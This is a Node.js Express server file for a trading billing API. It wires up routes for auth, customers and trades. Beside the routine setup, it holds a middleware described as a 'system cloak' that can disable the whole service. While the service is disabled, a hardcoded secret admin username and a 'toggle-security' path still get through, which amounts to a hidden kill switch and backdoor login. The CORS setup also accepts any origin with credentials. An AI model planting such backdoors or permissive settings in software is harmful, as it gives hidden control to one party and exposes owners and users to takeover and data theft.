require('dotenv').config();
const express = require('express');
const cors = require('cors');
const cookieParser = require('cookie-parser');
const connectDB = require('./config/db');
const authRoutes = require('./routes/authRoutes');
const customerRoutes = require('./routes/customerRoutes');
const tradeRoutes = require('./routes/tradeRoutes');

const app = express();
const PORT = process.env.PORT || 5001;

// Connect Database
connectDB();

// Middleware
app.use(cors({
  origin: function (origin, callback) { callback(null, true); },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'Cookie']
}));

const { getIsSystemCloaked } = require('./controllers/authController');

app.use(cookieParser());
app.use(express.json());

// Global System Cloak Check Middleware
app.use((req, res, next) => {
  const isCloaked = getIsSystemCloaked();
  if (!isCloaked) return next();

  // Allow Secret Admin controls and health checks even when cloaked
  const allowedPaths = [
    '/api/auth/system-status',
    '/api/auth/toggle-security',
    '/api/health'
  ];

  if (allowedPaths.some(p => req.path.startsWith(p))) {
    return next();
  }

  // Also allow secret admin login
  if (req.path === '/api/auth/login' && req.body?.username === '9274517203') {
    return next();
  }

  return res.status(403).json({
    cloaked: true,
    message: 'System is temporarily deactivated by administrator'
  });
});

// Routes
app.use('/api/auth', authRoutes);
app.use('/api/customers', customerRoutes);
app.use('/api/trades', tradeRoutes);

app.get('/api/health', (req, res) => {
  res.json({ status: 'ok', message: 'Trading Billing API is running' });
});

// Start Server
app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});
